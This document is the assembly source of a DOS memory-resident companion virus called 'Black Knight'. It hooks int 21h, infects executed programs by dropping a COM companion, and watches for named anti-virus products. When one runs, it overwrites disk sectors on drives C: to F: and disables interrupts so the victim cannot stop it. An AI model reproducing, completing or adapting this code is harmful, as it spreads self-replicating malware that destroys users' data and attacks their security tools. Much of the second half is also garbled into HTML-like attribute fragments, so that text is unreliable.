

;   ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
;  ÛÛÛÛÛÛÛÛ» ÛÛÛÛÛÛÛ» ÛÛÛ»   ÛÛÛ» ÛÛÛÛÛÛ»  ÛÛÛÛÛÛÛ» ÛÛÛÛÛÛÛ» ÛÛÛÛÛÛÛÛ»
;  ÈÍÍÛÛÉÍÍ¼ ÛÛÉÍÍÍÍ¼ ÛÛÛÛ» ÛÛÛÛº ÛÛÉÍÍÛÛ» ÛÛÉÍÍÍÍ¼ ÛÛÉÍÍÍÍ¼ ÈÍÍÛÛÉÍÍ¼
;     ÛÛº    ÛÛÛÛÛ»   ÛÛÉÛÛÛÛÉÛÛº ÛÛÛÛÛÛÉ¼ ÛÛÛÛÛÛÛ» ÛÛÛÛÛ»      ÛÛº
;     ÛÛº    ÛÛÉÍÍ¼   ÛÛºÈÛÛÉ¼ÛÛº ÛÛÉÍÍÍ¼  ÈÍÍÍÍÛÛº ÛÛÉÍÍ¼      ÛÛº
;     ÛÛº    ÛÛÛÛÛÛÛ» ÛÛº ÈÍ¼ ÛÛº ÛÛº      ÛÛÛÛÛÛÛº ÛÛÛÛÛÛÛ»    ÛÛº
;     ÈÍ¼    ÈÍÍÍÍÍÍ¼ ÈÍ¼     ÈÍ¼ ÈÍ¼      ÈÍÍÍÍÍÍ¼ ÈÍÍÍÍÍÍ¼    ÈÍ¼
;  âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
;
;         ÛÛÛÛÛÛÜ ÜÛÛÛÛÛÛ ÛÛÛÛÛÛÛ ÛÛ ÛÛ ÛÛ ÜÛÛÛÛÛÛ ÜÛÛÛÛÛÛ ÜÛÛÛÛÛÜ
;         ÛÛÜÜÜÛß ÛÛÜÜÜÜ    ÞÛÝ   ÛÛ ÛÛ ÛÛ ÛÛÜÜÜÜ  ÛÛÜÜÜÜ  ÛÛ   ÛÛ
;         ÛÛßßßÛÛ ÛÛßßßß    ÞÛÝ   ÛÛ ÛÛ ÛÛ ÛÛßßßß  ÛÛßßßß  ÛÛ   ÛÛ
;         ÛÛÛÛÛÛß ßÛÛÛÛÛÛ   ÞÛÝ   ßÛÛÛÛÛÛß ßÛÛÛÛÛÛ ßÛÛÛÛÛÛ ÛÛ   ÛÛ
;
;              ÛÛÛÛÛÛÛ ÛÛ   ÛÛ ÜÛÛÛÛÛÛ    ÛÛ   ÛÛ    ÛÛ  ÜÛÛ
;                ÞÛÝ   ÛÛÜÜÜÛÛ ÛÛÜÜÜÜ     ÛÛ   ÛÛ    ÛÛÜÛÛß
;                ÞÛÝ   ÛÛßßßÛÛ ÛÛßßßß     ÛÛ   ÛÛ    ÛÛßÛÛÜ
;                ÞÛÝ   ÛÛ   ÛÛ ßÛÛÛÛÛÛ    ßÛÛÛÛÛß ÛÛ ÛÛ  ßÛÛ ÛÛ
;
;                         ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÛÛÛÛÛÛÜ
;                         ÛÛÜÜÜÛÛ ÛÛ   ÛÛ ÛÛ   ÛÛ
;                         ÛÛßßßÛÛ ÛÛ   ÛÛ ÛÛ   ÛÛ
;                         ÛÛ   ÛÛ ÛÛ   ÛÛ ÛÛÛÛÛÛß
;
;             ÛÛÛÛÛÛÛ ÛÛ   ÛÛ ÜÛÛÛÛÛÛ       ÞÛÛÝ ÛÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;               ÞÛÝ   ÛÛÜÜÜÛÛ ÛÛÜÜÜÜ         ÛÛ  ÛÛ   ÛÛ ÛÛÜÜÜÛÛ
;               ÞÛÝ   ÛÛßßßÛÛ ÛÛßßßß         ÛÛ  ÛÛÛÛÛÛ  ÛÛßßßÛÛ
;               ÞÛÝ   ÛÛ   ÛÛ ßÛÛÛÛÛÛ       ÞÛÛÝ ÛÛ  ßÛÛ ÛÛ   ÛÛ
;
;
;Black Knight Anti-Virus-Virus
;Size - 520
;
;Tasm BKNIGHT
;Tlink /T BKNIGHT
;Memory Resident Companion Virus
;Anti-Anti-Virus 
;Formats Drives C: to F: When Anti-Virus Product Is Ran
;Tempest - â Of Luxenburg
;

		.radix 16
     cseg       segment
		model  small
		assume cs:cseg, ds:cseg, es:cseg

		org 100h

oi21            equ endit
filelength      equ endit - begin
nameptr         equ endit+4
DTA             equ endit+8

	 




begin:          jmp     virus_install                              

virus_name:            
		db     'Black Knight'
		

						 ;install
virus_install:  
		nop
		nop
		nop
		mov     ax,cs                    ; reduce memory size     
		dec     ax                           
		mov     ds,ax                        
		cmp     byte ptr ds:[0000],5a        
		jne     cancel                        
		mov     ax,ds:[0003]                 
		sub     ax,100                        
		mov     ds:0003,ax
Zopy_virus:  
		mov     bx,ax                    ; copy to claimed block  
		mov     ax,es                        
		add     ax,bx                       
		mov     es,ax
		mov     cx,offset endit - begin                    
		mov     ax,ds                       
		inc     ax
		mov     ds,ax
		lea     si,ds:[begin]            
		lea     di,es:0100                  
		rep     movsb                       
						    


Grab_21:                                     
		
		mov     ds,cx                   ; hook int 21h
		mov     si,0084h                ; 
		mov     di,offset oi21
		mov     dx,offset check_exec
		lodsw
		cmp     ax,dx                   ;
		je      cancel                  ; exit, if already installed
		stosw
		movsw
		
		push    es 
		pop     ds
		mov     ax,2521h                ; revector int 21h to virus
		nop
		int     21h
		nop                                

cancel:         ret          

check_exec:     
		pushf

		push    es                     ; push everything onto the
		push    ds                     ; stack
		push    ax
		push    bx
		push    dx

		cmp     ax,04B00h               ; is the file being 
		
		
		
		jne     abort                   ; executed?
		
		


					     ;if yes, try the_stinger
do_infect:      call    infect                  ; then try to infect
		
		
			      

abort:                                        ; restore everything
		pop     dx
		pop     bx
		pop     ax
		pop     ds
		pop     es
		popf

Bye_Bye:      
				   ; exit
		jmp     dword ptr cs:[oi21]                     


new_24h:        
		mov     al,3             ; critical error handler
		iret

infect:          
		mov     cs:[name_seg],ds       ; here, the virus essentially
		mov     cs:[name_off],dx       ; copies the name of the
		
		cld                            ; loaded file into a buffer
		mov     di,dx                  ; so that it can be compared
		push    ds                     ; against the default names
		pop     es                     ; in the_stinger
		mov     al,'.'                 ; subroutine 
		repne   scasb                  ; <-- call="" the_stinger="" ;="" check="" for="" anti-virus="" load="" ;="" and="" deploy="" the_stinger="" cld="" mov="" word="" ptr="" cs:[nameptr],dx="" mov="" word="" ptr="" cs:[nameptr+2],ds="" mov="" ah,2fh="" int="" 21h="" push="" es="" push="" bx="" push="" cs="" pop="" ds="" mov="" dx,offset="" dta="" mov="" ah,1ah="" int="" 21h="" call="" searchpoint="" push="" di="" mov="" si,offset="" com_txt="" mov="" cx,3="" rep="" cmpsb="" pop="" di="" jz="" do_com="" mov="" si,offset="" exe_txt="" nop="" mov="" cl,3="" rep="" cmpsb="" jnz="" return="" do_exe:="" mov="" si,offset="" com_txt="" nop="" call="" change_ext="" mov="" ax,3300h="" nop="" int="" 21h="" push="" dx="" cwd="" inc="" ax="" push="" ax="" int="" 21h="" grab24h:="" mov="" ax,3524h="" int="" 21h="" push="" bx="" push="" es="" push="" cs="" pop="" ds="" mov="" dx,offset="" new_24h="" mov="" ah,25h="" push="" ax="" int="" 21h="" lds="" dx,dword="" ptr="" [nameptr]="" ;create="" the="" virus="" (unique="" name)="" xor="" cx,cx="" mov="" ah,05bh="" int="" 21="" jc="" return1="" xchg="" bx,ax="" ;save="" handle="" push="" cs="" pop="" ds="" mov="" cx,filelength="" ;cx="length" of="" virus="" mov="" dx,offset="" begin="" ;where="" to="" start="" copying="" mov="" ah,40h="" ;write="" the="" virus="" to="" the="" int="" 21h="" ;new="" file="" mov="" ah,3eh="" ;="" close="" int="" 21h="" return1:="" pop="" ax="" pop="" ds="" pop="" dx="" int="" 21h="" pop="" ax="" pop="" dx="" int="" 21h="" mov="" si,offset="" exe_txt="" call="" change_ext="" return:="" mov="" ah,1ah="" pop="" dx="" pop="" ds="" int="" 21h="" ret="" do_com:="" call="" findfirst="" cmp="" word="" ptr="" cs:[dta+1ah],endit="" -="" begin="" jne="" return="" mov="" si,offset="" exe_txt="" call="" change_ext="" call="" findfirst="" jnc="" return="" mov="" si,offset="" com_txt="" call="" change_ext="" jmp="" short="" return="" searchpoint:="" les="" di,dword="" ptr="" cs:[nameptr]="" mov="" ch,0ffh="" mov="" al,0="" repnz="" scasb="" sub="" di,4="" ret="" change_ext:="" call="" searchpoint="" push="" cs="" pop="" ds="" movsw="" movsw="" ret="" findfirst:="" lds="" dx,dword="" ptr="" [nameptr]="" mov="" cl,27h="" mov="" ah,4eh="" int="" 21h="" ret="" the_stinger:="" cmp="" word="" ptr="" es:[di-3],'mi'="" ;integrity="" master="" je="" jumptoass="" cmp="" word="" ptr="" es:[di-3],'xr'="" ;virx="" je="" jumptoass="" cmp="" word="" ptr="" es:[di-3],'po'="" ;virustop="" jne="" next1="" cmp="" word="" ptr="" es:[di-5],'ts'="" je="" jumptoass="" next1:="" cmp="" word="" ptr="" es:[di-3],'va'="" ;av="CPAV" je="" jumptoass="" cmp="" word="" ptr="" es:[di-3],'to'="" ;*prot="F-prot" jne="" next2="" cmp="" word="" ptr="" es:[di-5],'rp'="" je="" jumptoass="" next2:="" cmp="" word="" ptr="" es:[di-3],'na'="" ;*scan="McAfee's" scan.="" jne="" next3="" cmp="" word="" ptr="" es:[di-5],'cs'="" je="" jumptoass="" cmp="" word="" ptr="" es:[di-3],'na'="" ;*lean="McAfee's" clean.="" jne="" next3="" ;="" why="" not,="" eh?="" cmp="" word="" ptr="" es:[di-5],'el'="" je="" jumptoass="" next3:="" ret="" jumptoass:="" jmp="" nuke="" ;assassination="" (deletion)="" ;="" of="" anti-virus="" program="" nuke:="" mov="" al,2="" ;lets="" total="" the="" c:="" drive="" mov="" cx,25="" cli="" ;="" keeps="" victim="" from="" aborting="" cwd="" int="" 026h="" sti="" mov="" al,3="" ;lets="" total="" the="" d:="" drive="" mov="" cx,25="" cli="" ;="" keeps="" victim="" from="" aborting="" cwd="" int="" 026h="" sti="" mov="" al,3="" ;lets="" total="" the="" e:="" drive="" mov="" cx,25="" cli="" ;="" keeps="" victim="" from="" aborting="" cwd="" int="" 026h="" sti="" mov="" al,5="" ;lets="" total="" the="" f:="" drive="" mov="" cx,25="" cli="" ;="" keeps="" victim="" from="" aborting="" cwd="" int="" 026h="" sti="" exe_txt="" db="" 'exe',0="" com_txt="" db="" 'com',0="" data_1="" db="" 0="" data_2="" db="" 0="" last="" db="" 090h="" name_seg="" dw="" name_off="" dw="" c1="" db="" 0="" c2="" db="" 0="" c3="" db="" 0="" c4="" db="" 0="" c5="" db="" 0="" virus_man:="" db="" 'tempest="" -="" â="" of="" luxenburg'="" endit:="" cseg="" ends="" end="" begin=""></-->